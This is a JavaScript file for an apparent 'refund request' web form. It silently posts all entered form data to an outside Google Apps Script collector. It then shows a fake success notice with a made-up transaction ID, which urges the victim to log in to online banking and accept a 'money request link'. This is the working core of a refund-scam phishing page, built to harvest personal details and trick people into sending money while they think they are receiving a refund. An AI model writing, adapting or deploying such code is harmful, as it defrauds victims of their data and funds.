const form = document.getElementById("refundForm");
const submitBtn = document.getElementById("submitBtn");
const message = document.getElementById("formMessage");

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwzW_FOuVl7Lryudoi3nyaSmokcrti7wVgPbpcZ1VCKF63e-fFT4NJzJ3j_QG--6jfagg/exec";
form.addEventListener("submit", async function (e) {

    e.preventDefault();

    if (!form.checkValidity()) {

        message.style.display = "block";
        message.className = "error";
        message.textContent = "Please complete all required fields.";
        return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    message.style.display = "none";

    const formData = new FormData(form);

    try {

        await fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            body: new URLSearchParams(formData)
        });

        message.style.display = "block";
        message.className = "success";
        message.innerHTML = `
            <strong>✔ Refund Request Submitted Successfully!</strong><br><br>
           Your Reimbursement has been processed successfully.

Your Reimbursement Transaction ID : 085-59250-159759-786420 .

We Have Successfully Sent You A Money Request Link On Your Bank.

Dear Customer, 
                          Please verify and log in to your online banking on the same browser where you submitted your cancellation and refund form and accept the money request link to complete your transaction.<br>
        `;

        submitBtn.textContent = "Submitted ✓";

        form.reset();

    } catch (error) {

        console.error(error);

        message.style.display = "block";
        message.className = "error";
        message.textContent = "Unable to submit your request.";

        submitBtn.disabled = false;
        submitBtn.textContent = "Submit Refund Request";
    }

});